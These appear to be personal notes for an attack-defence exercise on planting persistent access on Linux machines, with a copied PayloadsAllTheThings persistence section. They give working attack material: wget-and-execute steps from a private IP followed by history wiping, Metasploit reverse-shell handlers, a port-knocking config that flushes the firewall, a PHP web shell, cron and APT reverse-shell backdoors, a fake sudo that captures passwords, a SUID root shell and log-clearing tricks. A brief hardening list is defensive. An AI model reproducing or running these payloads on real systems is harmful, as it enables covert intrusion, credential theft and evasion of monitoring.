# ideas
* script -> input LHOST Lport -> generate persistence.sh
* sniff packets over to attacker (maybe through diff protocol ) (tcpdump) (try using icmp from hacktrics file exfil) (nc with udp)
* modify core commands (try ssh -> sshpass) -> store in fake paths and
* maybe to hide (use original command (try netsat), ps > grep out your sink > pass to unsuspecting user)
* creat a . directory with spaces
* try systemd timer
* generate random file and dir everywhere
* include random filename for payload
* insert different users in different places

* reseach sliver payload -> github.com/bishop/sliver || prism || plant bind shell
* hide in sbin + other default linux locations
* set mod date as normal 
* test rootkits (https://github.com/nurupo/rootkit)
* configure port knocking
* webshells (test revshell on it) 
* weaking sript (flush ip tables)
* work on not replaying commands
* try convert bash script to binary and obufscate https://www.reddit.com/r/hacking/comments/bb5xqq/whats_the_best_way_to_obfuscate_bash_scripts/
* create an antidote ()
* try udp rev shell
* send password with get
* try out BEEF
* try https://www.ired.team/offensive-security/lateral-movement/ssh-tunnelling-port-forwarding https://markeldo.com/Reach-out-and-catch-shells-with-SSH-port-forwarding/ https://www.pivotpointsecurity.com/blog/fun-with-ssh-reverse-shells/
* furstrate red team via path
* mount process Id to hide
* try encrypted socat
* chkconfig --add mall  &&  chkconfig mall on && chkconfig --list (cent os) add script to (/etc/init.d/)
* view recent files and change to a later date
* modify ssh || passwd to steal creds
* copy /bin/nc to something else
* use ipfs for payloads
* knockd for payload execution and C2
* ssh-key gen then steal keys
* Armitage
* create fake bank for windows or do a mitm (proxy all connections through a host)
* add capabilities
* 

https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/local

# harden
* blacklist php functions in php.ini
* cancel rsa and pubkey login
* reset cronjobs
* block outbound syn in Iptables
* set IPtables
* monitor (ps) (snoppy) https://www.youtube.com/watch?v=gH_q0zRcPuI 
* * file, /etc/crontab, ~/.profile, ~/.bashrc , authorized_keys
* * process, whoami, ifconfig 
* * tail history -f || w
* * remove compiler, nc, python, 
* * stop file
* ./secure.sh IP
* nohup tcpdump 
* if python rev shell -> remove pty.p rplace spwan funcrtion
* change common binaries 
* install new ssh 
* `for i in $(seq 0 2000); do echo -n "$i:"; curl urltolfi?url=../../../../../../../proc/$i/cmdline --output -; echo; done`
* disable ssh tunneling `Tunnel no`
* monitor and kill unknown sessions https://www.cyberciti.biz/tips/howto-linux-kill-and-logout-users.html

# Weakening (make antidote along side)

* install malicious ssh
* ssh config
* enable telnet
* disable logs
* create lots and lots of fake dir

# Listen On Metasploit

* use exploit/multi/handler
* set ExitOnSession false
* set LHOST LPORT
* exploit

# Listen On Webdev

* use exploit/multi/script/web_delivery
* set URIPATH ans

* use exploit/multi/handler
* set ExitOnSession false
* set LHOST LPORT
* exploit

# Automate metasploit
unicorn.rc
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.118
set LPORT 9001
set ExitOnSession false
set AutoVerifySession false
set AutoSystemInfo false
set AutoLoadStdapi false
exploit -j
```

# commands
* iptables -F
* wget http://10.15.0.31:132/Downloads/script.sh
* chmod +x script.sh
* sudo ./script.sh 
* history -c

wget http://10.15.0.31:132/Downloads/kernellib.sh
chmod +x kernellib.sh
* sudo ./kernellib.sh
* history -c

/etc/default/knockd
Locate the line `START_KNOCKD=0`. Uncomment it and set the value to 1
KNOCKD_OPTS="-i eth1"

/etc/knockd.conf
```
[options] 
    logfile = /dev/null

[open137] 
    sequence = 10001,10002,10003 
    seq_timeout = 20 
    tcpflags = syn 
    command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 132 -j ACCEPT

[open8080] 
    sequence = 10004,10005,10006 
    seq_timeout = 20 
    command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 8080 -j ACCEPT 
    tcpflags = syn

[open132] 
     sequence = 10007,10008,10009 
     seq_timeout = 20 
     command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 9001 -j ACCEPT 
     tcpflags = syn

[open1111] 
     sequence = 10,100,1000 
     seq_timeout = 20 
     command = /sbin/iptables -F
     tcpflags = syn
```
sudo systemctl start knockd
sudo systemctl enable knockd

```
<?php
if (ISSET($_REQUEST['check'])){
    echo 'pong';
    return;
}

if($_REQUEST['letmein'] == ""){
    return;
}

if (ISSET($_POST['cmd'])) {
    $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
    foreach ($output as $line) {
        echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "<br>";
    }
    die(); 
} else if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
    $filename = $_FILES["file"]["name"];
    $path = $_POST['path'];
    if ($path != "/") {
        $path .= "/";
    } 
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename)) {
        echo htmlentities($filename) . " successfully uploaded to " . htmlentities($path);
    } else {
        echo "Error uploading " . htmlentities($filename);
    }
    die();
}
?>

```




# Generate Payload
* (script/Linux/PayGen.sh)
* (msf) use exploit/multi/script/web_delivery
* * set URIPATH www
* * set LHOST eth0
* * add output to Persiistence script

# Run Persistence on victim
* (script/Linux/Persistence.sh)
* * uncomment self delete at end

# Hide processes
* sudo mount -o bind /tmp /proc/<pid> ==> (script) get list and auto hide (try recursively)

# Hide in memory with ddexec (github)



# From (swisskyrepo/PayloadsAllTheThings) Linux - Persistence

## Summary

* [Basic reverse shell](#basic-reverse-shell)
* [Add a root user](#add-a-root-user)
* [Suid Binary](#suid-binary)
* [Crontab - Reverse shell](#crontab-reverse-shell)
* [Backdooring a user's bash_rc](#backdooring-an-users-bash-rc)
* [Backdooring a startup service](#backdoor-a-startup-service)
* [Backdooring a user startup file](#backdooring-an-user-startup-file)
* [Backdooring a driver](#backdooring-a-driver)
* [Backdooring the APT](#backdooring-the-apt)
* [Backdooring the SSH](#backdooring-the-ssh)
* [Tips](#tips)
* [Additional Linux Persistence Options](#additional-persistence-options)
* [References](#references)


## Basic reverse shell

```bash
ncat --udp -lvp 4242
ncat --sctp -lvp 4242
ncat --tcp -lvp 4242
```

## Add a root user

```powershell
sudo useradd -ou 0 -g 0 john
sudo passwd john
echo "linuxpassword" | passwd --stdin john
```

## Suid Binary

```powershell
TMPDIR2="/var/tmp"
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
rm $TMPDIR2/croissant.c
chown root:root $TMPDIR2/croissant
chmod 4777 $TMPDIR2/croissant
```

## Crontab - Reverse shell

```bash
(crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null
```

## Backdooring a user's bash_rc 

(FR/EN Version)

```bash
TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"
cat << EOF > /tmp/$TMPNAME2
  alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale  = "en" ]; then echo -n "[sudo] password for \$USER: ";fi;if [ \$locale  = "fr" ]; then echo -n "[sudo] Mot de passe de \$USER: ";fi;read -s pwd;echo; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S '
EOF
if [ -f ~/.bashrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.bashrc
fi
if [ -f ~/.zshrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.zshrc
fi
rm /tmp/$TMPNAME2
```

or add the following line inside its .bashrc file.

```powershell
$ chmod u+x ~/.hidden/fakesudo
$ echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc
```

and create the `fakesudo` script.

```powershell
read -sp "[sudo] password for $USER: " sudopass
echo ""
sleep 2
echo "Sorry, try again."
echo $sudopass >> /tmp/pass.txt

/usr/bin/sudo $@
```


## Backdooring a startup service

```bash
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
```

## Backdooring a user startup file

Linux, write a file in  `~/.config/autostart/NAME_OF_FILE.desktop`

```powershell
In : ~/.config/autostart/*.desktop

[Desktop Entry]
Type=Application
Name=Welcome
Exec=/var/lib/gnome-welcome-tour
AutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guide
OnlyShowIn=GNOME;
X-GNOME-Autostart-enabled=false
```

## Backdooring a driver

```bash
echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
```

## Backdooring the APT

If you can create a file on the apt.conf.d directory with: `APT::Update::Pre-Invoke {"CMD"};`
Next time "apt-get update" is done, your CMD will be executed!

```bash
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
```

## Backdooring the SSH

Add an ssh key into the `~/.ssh` folder.

1. `ssh-keygen`
2. write the content of `~/.ssh/id_rsa.pub` into `~/.ssh/authorized_keys`
3. set the right permission, 700 for ~/.ssh and 600 for authorized_keys

## Tips

Hide the payload with ANSI chars, the following chars will clear the terminal when using cat to display the content of your payload.

```powershell
#[2J[2J[2J[2H[2A# Do not remove. Generated from /etc/issue.conf by configure.
```

Hide in plain sight using zero width spaces in filename.

```powershell
touch $(echo -n 'index\u200D.php') index.php
```

Clear the last line of the history.

```bash
history -d $(history | tail -2 | awk '{print $1}') 2> /dev/null
```

Clear history

```bash
[SPACE] ANY COMMAND
or
export HISTSIZE=0
export HISTFILESIZE=0
unset HISTFILE; CTRL-D
or
kill -9 $$
or
echo "" > ~/.bash_history
or
rm ~/.bash_history -rf
or
history -c
or
ln /dev/null ~/.bash_history -sf
```

The following directories are temporary and usually writeable

```bash
/var/tmp/
/tmp/
/dev/shm/
```
## Additional Persistence Options

* [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)
* [Compromise Client Software Binary](https://attack.mitre.org/techniques/T1554)
* [Create Account](https://attack.mitre.org/techniques/T1136/)
* [Create Account: Local Account](https://attack.mitre.org/techniques/T1136/001/)
* [Create or Modify System Process](https://attack.mitre.org/techniques/T1543/)
* [Create or Modify System Process: Systemd Service](https://attack.mitre.org/techniques/T1543/002/)
* [Event Triggered Execution: Trap](https://attack.mitre.org/techniques/T1546/005/) 
* [Event Triggered Execution](https://attack.mitre.org/techniques/T1546/)
* [Event Triggered Execution: .bash_profile and .bashrc](https://attack.mitre.org/techniques/T1546/004/)
* [External Remote Services](https://attack.mitre.org/techniques/T1133/)
* [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/)
* [Hijack Execution Flow: LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/)
* [Pre-OS Boot](https://attack.mitre.org/techniques/T1542/)
* [Pre-OS Boot: Bootkit](https://attack.mitre.org/techniques/T1542/003/)
* [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/) 
* [Scheduled Task/Job: At (Linux)](https://attack.mitre.org/techniques/T1053/001/)
* [Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)
* [Server Software Component](https://attack.mitre.org/techniques/T1505/)
* [Server Software Component: SQL Stored Procedures](https://attack.mitre.org/techniques/T1505/001/)
* [Server Software Component: Transport Agent](https://attack.mitre.org/techniques/T1505/002/) 
* [Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) 
* [Traffic Signaling](https://attack.mitre.org/techniques/T1205/)
* [Traffic Signaling: Port Knocking](https://attack.mitre.org/techniques/T1205/001/)
* [Valid Accounts: Default Accounts](https://attack.mitre.org/techniques/T1078/001/) 
* [Valid Accounts: Domain Accounts 2](https://attack.mitre.org/techniques/T1078/002/)

## References

* [@RandoriSec - https://twitter.com/RandoriSec/status/1036622487990284289](https://twitter.com/RandoriSec/status/1036622487990284289)
* [https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/](https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/)
* [http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html](http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html)
* [http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/](http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/)
* [Pouki from JDI](#no_source_code)
